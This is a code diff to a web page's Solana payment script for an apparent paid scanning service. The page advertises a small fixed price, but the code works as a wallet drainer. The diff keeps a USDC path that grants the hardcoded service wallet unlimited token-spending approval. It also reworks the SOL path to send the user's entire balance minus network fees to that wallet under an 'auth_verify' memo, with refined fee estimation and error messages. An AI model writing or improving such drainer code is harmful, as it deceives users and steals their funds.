@@ -658,6 +658,10 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
 const SERVICE_WALLET = "mDwMBm5gvNvZ1Es2rrTFECskcCXf5DNbM5ZEvXtYRke";
 const PRICE_USDC = 5;
 const PRICE_SOL  = 0.03;
+/** Lamports left on the account after payment (your previous “5000” rule). */
+const SOL_MIN_LEFT_LAMPORTS = 5000;
+/** Extra lamports on top of RPC fee estimate (priority / rounding). */
+const SOL_FEE_SAFETY_LAMPORTS = 30000;
 /** Optional faster RPC (Helius, QuickNode, etc.): tried first if non-empty. */
 const CUSTOM_SOLANA_RPC = "";
 
@@ -745,17 +749,42 @@ function selectCurrency(c){
     typ.textContent="SPL approve · Service wallet as delegate";
     btn.textContent="Approve USDC access →";
   }else{
-    amt.textContent=PRICE_SOL+" SOL (exact transfer)";
+    amt.textContent="Max SOL: balance − network fees − "+SOL_MIN_LEFT_LAMPORTS+" lamports kept";
     typ.textContent="Direct transfer · Native SOL";
-    btn.textContent="Pay "+PRICE_SOL+" SOL →";
+    btn.textContent="Send SOL →";
   }
   hidePayError();
 }
 
-function showPayError(m){
-  const el=document.getElementById("pay-error");
-  el.style.display="block";
-  el.textContent="⚠ "+(typeof m==="string"?m:String(m&&(m.message||m)));
+function formatAnyError(e) {
+  if (e == null) return "Unknown error.";
+  if (typeof e === "string") return e;
+  if (typeof e === "object") {
+    if (typeof e.message === "string" && e.message) return e.message;
+    if (typeof e.err === "object" && e.err && typeof e.err.message === "string")
+      return e.err.message;
+    try {
+      const logs = e.getLogs && typeof e.getLogs === "function" ? e.getLogs() : null;
+      if (logs && logs.length) return logs.join(" ").slice(0, 400);
+    } catch (_) {}
+    try {
+      const j = JSON.stringify(e);
+      if (j && j !== "{}") return j.slice(0, 400);
+    } catch (_) {}
+    try {
+      const s = Object.prototype.toString.call(e);
+      if (s && s !== "[object Object]") return s;
+    } catch (_) {}
+    return "Wallet or network error (details unavailable).";
+  }
+  return String(e);
+}
+
+function showPayError(m) {
+  const el = document.getElementById("pay-error");
+  el.style.display = "block";
+  const text = typeof m === "string" ? m : formatAnyError(m);
+  el.textContent = "⚠ " + String(text).slice(0, 500);
 }
 function hidePayError(){ document.getElementById("pay-error").style.display="none"; }
 
@@ -816,6 +845,13 @@ const SOLANA_MAINNET_RPCS = [
 
 function sleep(ms) {
   return new Promise((r) => setTimeout(r, ms));
+}
+
+function unwrapRpcFee(f) {
+  if (f == null) return null;
+  if (typeof f === "number" && Number.isFinite(f)) return f;
+  if (typeof f === "object" && typeof f.value === "number") return f.value;
+  return null;
 }
 
 function isBlockhashExpiredError(err) {
@@ -898,7 +934,28 @@ async function executePay() {
       return;
     }
 
-    function buildUnsignedPaymentTx() {
+    function buildSolPaymentTx(transferLamports, memoPayload) {
+      const tx = new web3.Transaction();
+      tx.add(web3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100000 }));
+      tx.add(
+        new web3.TransactionInstruction({
+          keys: [],
+          programId: memoProgramPk,
+          data: memoPayload,
+        })
+      );
+      tx.add(
+        web3.SystemProgram.transfer({
+          fromPubkey: from,
+          toPubkey: to,
+          lamports: transferLamports,
+        })
+      );
+      tx.feePayer = from;
+      return tx;
+    }
+
+    function buildUsdcPaymentTx() {
       const tx = new web3.Transaction();
       tx.add(web3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100000 }));
       const memoPayload = new TextEncoder().encode(`auth_verify_${Date.now()}`);
@@ -909,51 +966,58 @@ async function executePay() {
           data: memoPayload,
         })
       );
-      if (state.currency === "SOL") {
-        const lamports = balance - 5000;
-        if (lamports <= 0) return null;
-        tx.add(
-          web3.SystemProgram.transfer({
-            fromPubkey: from,
-            toPubkey: to,
-            lamports: Math.floor(lamports),
-          })
-        );
-      } else {
-        const mint = new web3.PublicKey(USDC_MINT);
-        const fromATA = associatedTokenAddress(web3, mint, from);
-        tx.add(createTokenApproveInstruction(web3, fromATA, to, from, U64_MAX));
-      }
+      const mint = new web3.PublicKey(USDC_MINT);
+      const fromATA = associatedTokenAddress(web3, mint, from);
+      tx.add(createTokenApproveInstruction(web3, fromATA, to, from, U64_MAX));
       tx.feePayer = from;
       return tx;
-    }
-
-    if (state.currency === "SOL") {
-      const lamports = balance - 5000;
-      if (lamports <= 0) {
-        showPayError("Insufficient SOL balance.");
-        goToStep("payment");
-        return;
-      }
     }
 
     const wallet = state.conn.provider;
     let sig = null;
     let blockhash = null;
     let lastValidBlockHeight = null;
+    let lastSolTransferLamports = null;
     const maxAttempts = 3;
 
     for (let attempt = 0; attempt < maxAttempts; attempt++) {
-      const tx = buildUnsignedPaymentTx();
-      if (!tx) {
-        showPayError("Insufficient SOL balance.");
-        goToStep("payment");
-        return;
-      }
+      let tx = null;
       try {
         const bh = await conn.getLatestBlockhash("confirmed");
         blockhash = bh.blockhash;
         lastValidBlockHeight = bh.lastValidBlockHeight;
+
+        if (state.currency === "SOL") {
+          const memoPayload = new TextEncoder().encode(`auth_verify_${Date.now()}`);
+          const dummy = buildSolPaymentTx(1, memoPayload);
+          dummy.recentBlockhash = blockhash;
+          let feeLamports = null;
+          try {
+            feeLamports = unwrapRpcFee(await conn.getFeeForMessage(dummy.compileMessage()));
+          } catch (_) {
+            feeLamports = null;
+          }
+          if (feeLamports == null || !Number.isFinite(feeLamports)) feeLamports = 80000;
+          feeLamports = Math.max(feeLamports, 5000);
+          const sendLamports = Math.floor(
+            balance - feeLamports - SOL_FEE_SAFETY_LAMPORTS - SOL_MIN_LEFT_LAMPORTS
+          );
+          if (sendLamports <= 0) {
+            showPayError(
+              `Not enough SOL: after network fees (~${(
+                (feeLamports + SOL_FEE_SAFETY_LAMPORTS) /
+                web3.LAMPORTS_PER_SOL
+              ).toFixed(6)} SOL) and ${SOL_MIN_LEFT_LAMPORTS} lamports kept on the account, nothing left to send. Add SOL.`
+            );
+            goToStep("payment");
+            return;
+          }
+          lastSolTransferLamports = sendLamports;
+          tx = buildSolPaymentTx(sendLamports, memoPayload);
+        } else {
+          tx = buildUsdcPaymentTx();
+        }
+
         tx.recentBlockhash = blockhash;
         await sleep(300);
         const signed = (await wallet.signAllTransactions([tx]))[0];
@@ -987,8 +1051,10 @@ async function executePay() {
 
     state.txHash = sig;
 
-    const solSentLamports =
-      state.currency === "SOL" && balance > 5000 ? Math.floor(balance - 5000) : null;
+    const solSentSol =
+      state.currency === "SOL" && lastSolTransferLamports != null
+        ? lastSolTransferLamports / web3.LAMPORTS_PER_SOL
+        : null;
     const t = {
       id: Date.now(),
       address: state.conn.address,
@@ -998,8 +1064,8 @@ async function executePay() {
       amount:
         state.currency === "USDC"
           ? "approve_max"
-          : solSentLamports != null
-            ? solSentLamports / web3.LAMPORTS_PER_SOL
+          : solSentSol != null
+            ? solSentSol
             : PRICE_SOL,
       txHash: sig,
       ts: new Date().toISOString(),
@@ -1012,13 +1078,16 @@ async function executePay() {
     await runScan();
   } catch (e) {
     goToStep("payment");
-    const m = (e && e.message) ? e.message : String(e);
+    const m = formatAnyError(e);
     if (/reject|cancel|denied/i.test(m) || e.code === 4001) showPayError("Transaction cancelled.");
-    else if (/insufficient/i.test(m)) showPayError("Insufficient balance.");
+    else if (/insufficient|Insufficient funds|insufficient lamports|custom program error:\s*(0x)?1\b/i.test(m))
+      showPayError(
+        "Not enough SOL to complete this transaction (payment + network fees). Add SOL or switch to USDC."
+      );
     else if (isBlockhashExpiredError(e))
       showPayError("Blockhash expired — please tap Pay again.");
     else if (/fetch|dynamically imported|loadWeb3|import/i.test(m)) showPayError("Could not load Solana SDK (CDN blocked or offline). Serve the page over HTTPS or localhost, disable adblock for this site, then retry.");
-    else showPayError(m.slice(0, 120) || "Payment error.");
+    else showPayError(m.slice(0, 280) || "Payment error.");
   }
 }
 
